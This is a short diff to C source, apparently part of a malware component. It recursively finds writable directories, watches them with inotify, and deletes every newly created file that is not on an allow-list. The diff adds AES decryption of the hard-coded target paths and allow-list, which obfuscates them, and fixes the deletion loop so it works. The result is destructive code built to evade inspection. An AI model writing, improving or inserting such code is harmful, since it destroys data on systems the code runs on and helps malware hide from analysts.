@@ -119,8 +119,12 @@ void find_writable_dirs_recursive(const char *dir) {
 }
 
 void find_writable_dirs_initial() {
-    for (int i = 0; i < sizeof(initial_paths) / sizeof(initial_paths[0]); i++) {
-        find_writable_dirs_recursive(initial_paths[i]);
+    for (int i = 0; i < (int)(sizeof(initial_paths) / sizeof(initial_paths[0])); i++) {
+        char *decrypted = aes_decrypt_hex_string(AES_KEY, initial_paths[i]);
+        if (decrypted) {
+            find_writable_dirs_recursive(decrypted);
+            free(decrypted);
+        }
     }
 }
 
@@ -160,23 +164,27 @@ void add_watcher(const char *path) {
 }
 
 void handle_inotify_event(struct inotify_event *event) {
-    for (int j = 0; j < num_paths; j++) {
+    for (int j = 0; j < num_watchers; j++) {
         if (event->wd != watchers[j]->wd) continue;
         if (event->mask & IN_ISDIR) continue;
 
         char name[FILENAME_MAX] = "";
-        strcpy(name, watchers[j]->path);
-        strcat(name, "/");
-        strcat(name, event->name);
+        snprintf(name, sizeof(name), "%s/%s", watchers[j]->path, event->name);
 
-        int h;
-        for (h = 0; h < sizeof(blacklisted) / sizeof(blacklisted[0]); ++h) {
-            if (strcmp(name, blacklisted[h]) == 0) continue;
+        int is_safe = 0;
+        for (int h = 0; h < (int)(sizeof(blacklisted) / sizeof(blacklisted[0])); ++h) {
+            char *decrypted = aes_decrypt_hex_string(AES_KEY, blacklisted[h]);
+            if (decrypted && strcmp(name, decrypted) == 0) {
+                is_safe = 1;
+                free(decrypted);
+                break;
+            }
+            free(decrypted);
         }
 
-        if (remove(name) == -1)
-            break;
-        
+        if (!is_safe) {
+            remove(name);
+        }
         break;
     }
 }
